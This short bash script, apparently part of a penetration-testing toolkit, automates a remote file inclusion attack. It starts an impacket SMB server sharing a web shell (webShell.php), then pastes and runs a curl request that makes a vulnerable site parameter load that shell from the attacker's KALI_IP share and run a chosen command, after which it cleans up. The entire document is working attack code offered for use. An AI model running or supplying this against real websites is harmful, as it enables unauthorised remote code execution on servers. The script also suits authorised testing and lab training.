#!/bin/bash

: '
Remote RFI with SMB
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
WEBSITE_FIELD=$(form_item "website" "website" "http://domain.com/?lang=")
CMD_FIELD=$(form_item "cmd" "cmd" "whoami")
PORT_FIELD=$(form_item "http port" "port" "9001")

# Generate GUI form
generate_form "${WEBSITE_FIELD}" "${CMD_FIELD}" "${PORT_FIELD}"

WEBSITE=${form_data["website"]}
CMD=${form_data["cmd"]}
PORT=${form_data["port"]}

cd "${SCRIPTS_DIR}/web/lfi/.files"
impacket-smbserver -smb2support share $(pwd) &
SMB_PID=$!

paste_command "curl -ks '${WEBSITE}\\\\${KALI_IP}\share\webShell.php&cmd=${CMD}'"
xdotool key Return
sleep 60

kill $SMB_PID
rm webShell.php
